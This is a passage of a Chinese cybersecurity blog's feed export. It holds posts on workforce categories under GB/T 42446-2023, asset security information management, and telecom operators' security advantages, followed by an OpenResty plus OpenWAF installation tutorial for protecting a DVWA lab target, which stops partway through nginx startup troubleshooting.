    <title>网络安全入行？来了解下网络安全从业人员类别及其工作任务</title>
    <link href="https://xiejava.gitee.io/posts/d2f9b6e7/"/>
    <id>https://xiejava.gitee.io/posts/d2f9b6e7/</id>
    <published>2023-04-27T03:20:28.000Z</published>
    <updated>2023-04-27T06:39:54.608Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230427/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E5%91%98.png" alt="在这里插入图片描述"></p><p>又到了每年重保期间，红蓝双方都开始进行准备蓄势待发，网络安全从业人员每年供不应求，尤其是重保期间，双方都在疯狂的招揽准备网络安全人员。那网络安全从业人员分类到底有哪些，都负责哪些具体的工作任务呢？</p><p>根据2023年最新发布的在今年10月1日即将实施的国标《GB T 42446-2023 信息安全技术 网络安全从业人员能力基本要求》的定义。<br><strong>网络安全从业人员（cybersecurity workforce）</strong>是从事网络安全工作，承担相应网络安全职责，并且具有相应网络安全知识和技能的人员。<br>网络安全从业人员完成工作任务需要具备相应的能力。工作任务是指为了实现组织的相关目标，需要执行的网络安全有关的一个或一组工作活动或工作内容。<br>网络安全从业人员的工作类别包括：<strong>网络安全管理、网络安全建设、网络安全运营、网络安全审计和评估、网络安全科研教育</strong>。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230427/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BB%8E%E4%B8%9A%E4%BA%BA%E5%91%98%E5%B7%A5%E4%BD%9C%E7%B1%BB%E5%88%AB.png" alt="网络安全从业人员的工作类别"></p><h3 id="网络安全管理"><a href="#网络安全管理" class="headerlink" title="网络安全管理"></a>网络安全管理</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全需求分析</td><td>依据法律法规、政策标准及业务流程要求，开展符合性需求分析、业务所依赖的信息通信技术（ICT）持续运行需求分析、数据安全需求分析等，定期或在遇到重大网络安全事件时对组织网络安全需求进行复审。</td></tr><tr><td>网络安全规划和管理</td><td>指导、制定、监督和执行网络安全战略规划、策略制度和体制机制。综合协调相关人员，采取各类网络安全控制措施，降低并缓解系统安全风险。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr><tr><td>网络安全咨询</td><td>根据组织的安全目标，提供安全规划、设计、实施、运维、管理等方面的政策法规和技术咨询服务。</td></tr></tbody></table><h3 id="网络安全建设"><a href="#网络安全建设" class="headerlink" title="网络安全建设"></a>网络安全建设</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全需求分析</td><td>依据法律法规、政策标准及业务流程要求，开展符合性需求分析、业务所依赖的信息通信技术（ICT）持续运行需求分析、数据安全需求分析等，定期或在遇到重大网络安全事件时对组织网络安全需求进行复审。</td></tr><tr><td>网络安全架构设计</td><td>依据网络安全需求分析、ICT基础设施现状、组织环境和业务特点等，从物理环境、通信网络、计算环境、区域边界等方面进行网络安全架构设计，形成网络安全架构实施方案。</td></tr><tr><td>网络安全开发</td><td>实现软件、硬件安全架构及功能开发，并对其进行测试、更新和维护。</td></tr><tr><td>供应链安全管理</td><td>运用供应链安全管理的方法、工具和技术，控制供应链安全风险，管理供应商及网络安全和信息化相关产品和服务的釆购。</td></tr><tr><td>网络安全集成实施</td><td>网络安全项目管理，信息系统安全集成过程中软硬件设备与系统的安装、调试、测试、配置、故障处理和工程实施，以及配合验收交付。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr></tbody></table><h3 id="网络安全运营"><a href="#网络安全运营" class="headerlink" title="网络安全运营"></a>网络安全运营</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全运维</td><td>利用网络安全技术/工具，根据网络安全相关标准和制度流程，操作、运行、维护和管理信息系统。</td></tr><tr><td>网络安全监测和分析</td><td>利用相关技术、工具和情报信息等对目标系统进行安全监测、分析和预警，并提出应对威胁的措施和改进建议。</td></tr><tr><td>网络安全应急管理</td><td>组织编制网络安全事件应急预案，实施网络安全应急演练，在应对突发/重大网络安全事件时，采取必要的应急处置措施将信息系统和业务恢复到正常状 态，并进行事件溯源和调查取证。</td></tr><tr><td>网络数据安全保护</td><td>针对网络数据收集、存储、使用、加工、传输、提供、公开等环节，采取措施保障网络数据安全。</td></tr><tr><td>个人信息保护</td><td>针对个人信息收集、存储、使用、加工、传输、提供、公开、删除等环节，采取措施保障个人信息安全。</td></tr><tr><td>密码技术应用</td><td>运用密码技术，进行信息系统安全密码保障的架构设计、系统集成、检测评估、运维管理、密码咨询等。</td></tr></tbody></table><h3 id="网络安全审计和评估"><a href="#网络安全审计和评估" class="headerlink" title="网络安全审计和评估"></a>网络安全审计和评估</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全审计</td><td>依据审计依据，在规定的审计范围内，监督和评价网络安全控制措施的设计有效性和执行有效性.确定被审计对象满足审计依据的程度，并提出网络安全工作改进的意见和建议。</td></tr><tr><td>网络安全测试</td><td>对目标系统的脆弱性和防御机制有效性进行验证，发现安全问题并提出改进建议；根据测试依据，识别并测试系统和产品的安全性。</td></tr><tr><td>网络安全评估</td><td>评估信息系统、业务及相关网络数据等的符合性和面临的网络安全风险，对风险进行识别、分析、评价，提出改进建议。</td></tr><tr><td>网络安全认证</td><td>对网络安全管理体系、服务、产品等开展认证与审核。电子数据取证对电子数据进行提取、固定、恢复、分析等工作。</td></tr></tbody></table><h3 id="网络安全科研教育"><a href="#网络安全科研教育" class="headerlink" title="网络安全科研教育"></a>网络安全科研教育</h3><table><thead><tr><th>工作任务</th><th>工作任务描叙</th></tr></thead><tbody><tr><td>网络安全研究</td><td>研究网络空间安全涉及的学科理论基础和方法论，研究网络安全新兴技术及应用、产业发展趋势，以及网络安全法律法规、政策、标准等。</td></tr><tr><td>网络安全培训和评价</td><td>开展网络安全培训方案和相关课程的设计、开发和持续改进，实施授课等培训活动，开展评价活动，例如：理论知识考试、技能操作考核、业绩评审、竞赛、选拔等。</td></tr></tbody></table><p>在重保期间，最火的就是网络安全运营及网络安全审计和评估人员，分别对应的是红队人员和蓝队人员。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230427/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%BA%E5%91%98.png&quot; 
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>安全运营之资产安全信息管理</title>
    <link href="https://xiejava.gitee.io/posts/a446b750/"/>
    <id>https://xiejava.gitee.io/posts/a446b750/</id>
    <published>2023-04-18T09:05:48.000Z</published>
    <updated>2023-04-18T09:13:22.470Z</updated>
    
    <content type="html"><![CDATA[<p>安全风险管理的三要素分别是资产、威胁和脆弱性，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。网络攻击主要利用了系统的脆弱性。由于网络管理对象（资产）自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。“摸清家底，认清风险”做好资产安全信息管理是安全运营的第一步也是最重要的一步。</p><h2 id="资产管理范围"><a href="#资产管理范围" class="headerlink" title="资产管理范围"></a>资产管理范围</h2><p>《GBT 20984-2007信息安全技术信息安全风险评估规范》中，对于资产的定义为“对组织有价值的信息或资源，是安全策略保护的对象”。</p><p>对于网络空间资产来说，这里的资产是指赛博空间中某机构所拥有的一切可能被潜在攻击者利用的设备、信息、应用等数字资产。具体对象包括但不限于硬件设备、云主机、操作系统、IP地址、端口、证书、域名、Web应用、业务应用、中间件、框架、机构公众号、小程序、App、API、源代码等。概括来说，只要是可操作的对象，不管是实体还是属性。都可以称之为“网络空间资产”。所以对于企业来说这些资产安全信息都要做好管理。参考博文《<a href="https://xiejava.blog.csdn.net/article/details/129344013" target="_blank" rel="noopener">网络安全之资产及攻击面管理</a>》</p><p>在工信部《基础电信企业资产安全管理平台建设指南（试行）》稿中，提到资产安全管理平台对于IP化软硬件资产提供安全管理，其管理范围包括但不限于网络产品、安全产品、物联网设备、办公外设、企业应用、系统软件、支撑系统。资产安全信息应该覆盖到所有的IP化软硬件资产。</p><p>资产安全信息一般包括资产的基本属性（如：资产名称、类型、型号、厂商、IP地址、操作系统及其版本信息、端口、服务信息、中间件及其版本信息、程序应用框架及其版本信息、应用软件及其版本信息等）、资产的安全属性（如：安全等级等与网络安全脆弱性整治和威胁监测处置有关的信息等）、资产的管理属性（如：使用单位、责任人、联系电话等）、资产的业务属性（包括所属的业务系统、承载的业务等），应对资产安全信息实施全生命周期管理。</p><h2 id="资产安全全生命周期管理"><a href="#资产安全全生命周期管理" class="headerlink" title="资产安全全生命周期管理"></a>资产安全全生命周期管理</h2><p>资产的全生命周期覆盖资产上线、资产运行、资产下线，在这过程中要对资产进行定级备案、对资产的台账进行维护、对资产进行风险评估、对资产进行定期的清查。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230418/%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8%E5%85%A8%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86.png" alt="资产安全全生命周期管理"></p><h3 id="资产上线"><a href="#资产上线" class="headerlink" title="资产上线"></a>资产上线</h3><p>企业应建立统一的资产安全信息管理平台。资产上线，应在资产投入使用前完成对企业信息资产纳管。主机、虚机资产安装资产采集 Agent，网络设备纳入专业网管系统管理，变更的资产信息每天向资产安全信息管理平台同步。 </p><h3 id="资产运行"><a href="#资产运行" class="headerlink" title="资产运行"></a>资产运行</h3><p>资产运行环节是资产生命周期中最重要的环节。安全运营维护单位应建立所辖资产清单台账，应确保相关信息资产IP 地址和端口全量纳管，实现资产安全信息管理平台数据与资产实际情况相符。做好资产运行期的资产台账维护和更新、做好定级备案信息的维护和更新、定期开展资产的风险评估等。</p><h3 id="资产下线"><a href="#资产下线" class="headerlink" title="资产下线"></a>资产下线</h3><p>资产下线意味着资产的生命周期结束，安全运营维护单位应在资产退网后一定时期内（ 如两周或15 日）内完成资产安全信息管理平台数据更新。</p><h3 id="资产台账维护"><a href="#资产台账维护" class="headerlink" title="资产台账维护"></a>资产台账维护</h3><p>安全运营维护单位应在资产上线前建立好资产台账并在投产前完成对企业信息资产在资产安全信息管理平台的纳管，在资产运行期定期维护台账信息如资产信息发生变化定期更新台账，资产下线推网后完成台账的删除及资产安全信息管理平台数据更新。资产台账维护的主要目的是要保障资产安全信息管理平台数据与资产实际情况相符。</p><h3 id="资产定级备案"><a href="#资产定级备案" class="headerlink" title="资产定级备案"></a>资产定级备案</h3><p>资产因为其业务属性的不一样，影响的业务也不一样。对于重点的业务系统应予以重点的关注和保护。对于大型关基企业应对资产根据其重要级别进行定级备案。根据级别的不同制定防护策略开展风险评估。一般来说由维护单位在资产的全生命周期内进行定级备案信息的维护和更新，如资产上线前进行定级备案，在系统资产发生变化或下线时进行定级备案信息的更新。安全运营支撑单位对定级备案信息开展技术复核后完成定级备案信息的提交。</p><h3 id="资产风险评估"><a href="#资产风险评估" class="headerlink" title="资产风险评估"></a>资产风险评估</h3><p>在资产上线前和资产承载的业务发生变化后都应该进行资产风险评估，并根据企业自身要求定期开展风险评估。根据资产定级备案的不同如三级及以上的网络设备和系统平台每年进行一次风险评估，二级网络设备和系统平台每两年进行一次风险评估。对于存在大量个人信息且暴露于互联网的网络设备和系统平台可以请具备资质的第三方单位开展风险评估。重大活动或重要保障前，开展专项风险评估等。 </p><h3 id="资产定期清查"><a href="#资产定期清查" class="headerlink" title="资产定期清查"></a>资产定期清查</h3><p>资产清查，主要是定期对一些“三无”、“七边”的管理覆盖不到位或存在管理薄弱环节的资产进行清查。识别并推进“三无”资产下线（“三无”指“无人管理、无人使用、无人防护”），对“七边”系统进行规范管理（“七边”指测试系统、试验平台、退网未离网系统、工程已上线加载业务但未正式交维系统、与合作伙伴共同运营的业务或系统、责任交接不清的系统、处于衰退期的系统）。安全运营维护单位应配合开展资产清查和纳管，在“三无”资产回收过程中进行系统保障和应急响应。 </p><p>做好资产安全信息管理是需要通过“技术”+“管理”手段相结合。技术方面企业可以根据自身需求建立资产安全管理平台、攻击面管理平台、互联网暴露面测绘平台，全面覆盖内外资产和互联网暴露面的资产管理；管理方面可以根据自身情况参考资产安全信息管理的全生命周期制定符合企业的资产安全信息管理制度。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;安全风险管理的三要素分别是资产、威胁和脆弱性，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。网络攻击主要利用了系统的脆弱性。由于网络管理对象（资产）自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。“摸清家底，认清风险”做好资产安全信息管理是
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>运营商在安全领域的优势分析</title>
    <link href="https://xiejava.gitee.io/posts/3b6a1140/"/>
    <id>https://xiejava.gitee.io/posts/3b6a1140/</id>
    <published>2023-04-11T06:03:26.000Z</published>
    <updated>2023-04-11T06:21:42.963Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230410/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A84.jpeg" alt="网络安全" title="网络安全"></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>近年来，中美贸易摩擦加剧，国际争端凸显，国家高度重视网络安全的建设，网络安全已上升及国家战略层面，网络空间作为“第五疆域”受到极大重视。个人与企业对于网络安全的需求不断增加，中国网络安全市场也随之发展。</p><h3 id="政策支持，网络安全需求不断增加"><a href="#政策支持，网络安全需求不断增加" class="headerlink" title="政策支持，网络安全需求不断增加"></a>政策支持，网络安全需求不断增加</h3><p>近年来，网络安全被提升到国家战略高度，正在加快推进网络安全技术自主创新，朝着建设网络强国目标不懈努力。2014年以来先后设立中国安全委员会、中央网络安全和信息化委员会，发布了《国家安全法》、《中华人民共和国网络安全法》、《国家网络空间安全战略》、《网络空间国际合作战略》、《中华人民共和国数据安全法》等多项鼓励行业发展的法规和政策。这些法规政策规范了网络信息安全行业，为网络安全行业发展营造了良好的环境。</p><h3 id="信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求"><a href="#信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求" class="headerlink" title="信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求"></a>信息化水平、云计算、大数据、5G、物联网水平提升，网络安全对产业及业态提出新要求</h3><p>近年来，中国信息化水平不断攀升：云计算的进步带动计算能力和数据的集中；大数据的出现带来数据收集、处理、分析业态的革新；5G网络加速了网络数据处理速度；随着“云+5G”的共同催化，联网设备将呈现指数级增长，中国网络安全行业未来将布局更多的应用领域。<br>同时，以上科技进步也引发了新的网络安全问题，对网络安全行业提出新要求，数据的产生流通和应用更加普遍化和密集化，使网络安全的防范更加复杂，对网络安全提出更高的挑战。<br>2019年9月27日工信部公开征求对《关于促进网络安全产业发展的指导意见（征求意见稿）》的意见，征求意见稿中提出，到2025年，培育形成一批年营收超过20亿的网络安全企业，形成若干具有国际竞争力的网络安全骨干企业，网络安全产业规模超过2000亿。</p><p>在此背景下大型国有企业尤其是电信运营商纷纷布局网络安全。如中国移动收购启明星辰、中国电信组建专门的网络与信息安全研究院成立成立天翼安全科技有限公司、联通成立一家专注于网络安全服务的新公司计划将信息安全业务打造成创新业务发展的主要增长点。</p><h2 id="优势分析"><a href="#优势分析" class="headerlink" title="优势分析"></a>优势分析</h2><p>那么运营商在安全领域发展都会有哪些优势呢？</p><h3 id="一、网络优势"><a href="#一、网络优势" class="headerlink" title="一、网络优势"></a>一、网络优势</h3><p>电信运营商，作为国家网络基础设施的建设者和运营者，具备强大的网络优势。在工信部《关于促进网络安全产业发展的指导意见（征求意见稿）》明确提出鼓励基础电信企业和云服务提供商发挥网络资源优势，面向客户提供网络安全监测预警、攻击防护、应急保障等增值服务。</p><h3 id="二、数据优势"><a href="#二、数据优势" class="headerlink" title="二、数据优势"></a>二、数据优势</h3><p>运营商有大网的数据优势，如：DDOS异常流量监测数据、IDC/ISP数据、僵木蠕恶意程序数据、互联网暴露资产数据等，通过整合电信运营商大网数据能力，汇聚各类安全数据资源，结合大网威胁情报信息，能够更好的赋能安全产品。</p><h3 id="三、产品优势"><a href="#三、产品优势" class="headerlink" title="三、产品优势"></a>三、产品优势</h3><p>运营商自身自研建设了大量的安全基础能力。以电信为例，近年来积极打造了一系列硬核自主研发的安全产品如云堤抗DDoS、互联网测绘平台、安全态势感知平台、安全运营中心、安全资源池等保租手等等，安全产品均已通过运营商级的大网实战验证。生态开放，具备端到端的产品集成、产品研发和定制能力，提供一体化、全方位、一站式的综合解决方案。相对于传统的安全产商，传统安全设备产商的某些个别的产品可能有优势，但产品可能只适配自家的产品，对其他厂商比较封闭，端到端的产品集成和定制化能力相对较弱。</p><h3 id="四、运营优势"><a href="#四、运营优势" class="headerlink" title="四、运营优势"></a>四、运营优势</h3><p>成功的安全在于运营，运营商自身作为典型的关基行业企业，面对工信部、通管局、公安、网信办等多个监管部门的监管和考核，自身积累了丰富的安全运营经验和实战化的重保经验，并且将自身的安全运营经验、重保经验赋能至安全产品。可面向行业监管单位和关基等客户量身打造基于实战化、可视化、专业级的安全运营产品集。而传统安全产商，一般只提供标准产品，安全运营经验赋能产品相对不足。</p><h3 id="五、服务优势"><a href="#五、服务优势" class="headerlink" title="五、服务优势"></a>五、服务优势</h3><p>电信运营商具备强大的信息化和安全的一体两翼的能力，比传统安全公司更懂信息化和网络，建立了从信息系统和网络的规划与设计、再到实施建设、生产运行维护，涉及整个业务系统安全稳定运行的安全服务体系。</p><p>电信运营商具备覆盖全国的省-市-县的本地化专业的安全服务团队，专业安全服务团队能对客户形成一对一的贴身服务。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230410/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A84.jpeg&quot; alt=&quot;网络安全&quot; title
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>OpenResty+OpenWAF的WEB防护实战</title>
    <link href="https://xiejava.gitee.io/posts/dbe7a5ab/"/>
    <id>https://xiejava.gitee.io/posts/dbe7a5ab/</id>
    <published>2023-04-07T08:38:57.000Z</published>
    <updated>2023-04-07T08:54:38.127Z</updated>
    
    <content type="html"><![CDATA[<p>OpenResty是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。本文介绍通过OpenResty+OpenWAF来搭建软WAF的应用，用来防护DVWA的靶机，然后我们通过攻击DVWA的靶机来看一下OpenWAF的防护效果。</p><h2 id="一、OpenResty-OpenWAF安装"><a href="#一、OpenResty-OpenWAF安装" class="headerlink" title="一、OpenResty+OpenWAF安装"></a>一、OpenResty+OpenWAF安装</h2><h3 id="1、安装依赖"><a href="#1、安装依赖" class="headerlink" title="1、安装依赖"></a>1、安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ wget GeoIP-devel git swig make perl perl-ExtUtils-Embed readline-devel zlib-devel -y</span><br></pre></td></tr></table></figure><p>安装libcidr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget http://www.over-yonder.net/~fullermd/projects/libcidr/libcidr-1.2.3.tar.xz</span><br><span class="line">tar -xvf libcidr-1.2.3.tar.xz</span><br><span class="line"><span class="built_in">cd</span> /opt/libcidr-1.2.3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>升级openssl版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget -c http://www.openssl.org/<span class="built_in">source</span>/openssl-1.1.1d.tar.gz --no-check-certificat</span><br><span class="line">tar -zxvf openssl-1.1.1d.tar.gz</span><br><span class="line"><span class="built_in">cd</span> openssl-1.1.1d/</span><br><span class="line">./config</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>下载pcre-jit<br>并解压pcre-jit，后面安装OpenResty的时候引入并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://udomain.dl.sourceforge.net/project/pcre/pcre/8.45/pcre-8.45.tar.gz --no-check-certificate</span><br><span class="line">tar -zxvf pcre-8.45.tar.gz</span><br></pre></td></tr></table></figure><h3 id="2、安装OpenWAF"><a href="#2、安装OpenWAF" class="headerlink" title="2、安装OpenWAF"></a>2、安装OpenWAF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/titansec/OpenWAF.git</span><br><span class="line">mv /opt/OpenWAF/lib/openresty/ngx_openwaf.conf /etc</span><br><span class="line">mv /opt/OpenWAF/lib/openresty/configure /opt/openresty-1.19.3.1</span><br><span class="line">cp -RP /opt/OpenWAF/lib/openresty/* /opt/openresty-1.19.9.1/bundle/</span><br><span class="line"><span class="built_in">cd</span> /opt/OpenWAF/</span><br><span class="line">make clean</span><br><span class="line">make install</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/lib/libcidr.so /opt/OpenWAF/lib/resty/libcidr.so</span><br></pre></td></tr></table></figure><h3 id="3、安装OpenResty"><a href="#3、安装OpenResty" class="headerlink" title="3、安装OpenResty"></a>3、安装OpenResty</h3><p>OpenResty官网的下载地址 <a href="https://openresty.org/en/download.html" target="_blank" rel="noopener">https://openresty.org/en/download.html</a><br>目前最新版本是1.21.4.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget https://openresty.org/download/openresty-1.21.4.1.tar.gz</span><br><span class="line">tar -zxvf openresty-1.21.4.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> /opt/openresty-1.21.4.1/</span><br><span class="line">./configure --with-pcre-jit --with-ipv6 --with-http_stub_status_module --with-http_ssl_module --with-http_realip_module --with-http_sub_module --with-http_geoip_module --with-openssl=/opt/openssl-1.1.1d --with-pcre=/opt/pcre-8.45</span><br><span class="line">gmake &amp;&amp; gmake install</span><br></pre></td></tr></table></figure><p>设置nginx开机自启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vim /lib/systemd/system/nginx.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx</span><br><span class="line">ExecReload=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx -s reload</span><br><span class="line">ExecStop=/usr/<span class="built_in">local</span>/openresty/nginx/sbin/nginx -s quit</span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置开机启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> nginx</span><br><span class="line"><span class="comment"># 查看服务当前状态</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="comment"># 启动nginx服务</span></span><br><span class="line">systemctl start nginx</span><br><span class="line"><span class="comment"># 停止nginx服务</span></span><br><span class="line">systemctl stop nginx</span><br><span class="line"><span class="comment"># 重启nginx服务</span></span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p>当我们启动nginx的时候发现启动失败了，原因是因为原来安装了apache端口是80，nginx的端口也是80，端口冲突了。解决方案要不是改nginx端口，要不就是改apache的端口。这里将apache的端口改成8080。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost OpenWAF]<span class="comment"># systemctl start nginx</span></span><br><span class="line">Job <span class="keyword">for</span> nginx.service failed because the control process exited with error code. See <span class="string">"systemctl status nginx.service"</span> and <span class="string">"journalctl -xe"</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure><p>查看nginx启动状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost OpenWAF]<span class="comment"># systemctl status nginx</span></span><br><span class="line">● nginx.service - nginx</span><br><span class="line">Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled)</span><br><span class="line">Active: failed (Result: <span class="built_in">exit</span>-code) since Tue 2023-04-04 04:00:44 PDT; 19s ago</span><br><span class="line">Process: 42096 ExecStart=/usr/<span 